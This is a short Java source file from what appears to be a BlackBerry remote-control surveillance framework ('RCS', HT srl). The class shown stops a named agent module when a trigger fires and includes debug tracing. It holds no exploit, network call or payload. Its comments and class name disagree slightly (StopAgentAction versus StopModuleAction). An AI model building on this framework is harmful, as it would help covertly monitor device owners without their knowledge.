//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : StopAgentAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import blackberry.AgentManager;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;


/**
 * The Class StopAgentAction.
 */
public final class StopModuleAction extends ModuleAction {
    //#ifdef DEBUG
    static Debug debug = new Debug("StopAgentAction", DebugLevel.VERBOSE);
    //#endif
 
    public StopModuleAction(ConfAction params) {
        super(params);
    }

    public boolean execute(Trigger trigger) {
        //#ifdef DEBUG
        debug.trace("execute "+moduleId);
        //#endif

        final AgentManager agentManager = AgentManager.getInstance();

        agentManager.stop(moduleId);
        return true;
    } 

    //#ifdef DEBUG
    public String toString() {
        return "Stop " + moduleId;
    }
    //#endif
}
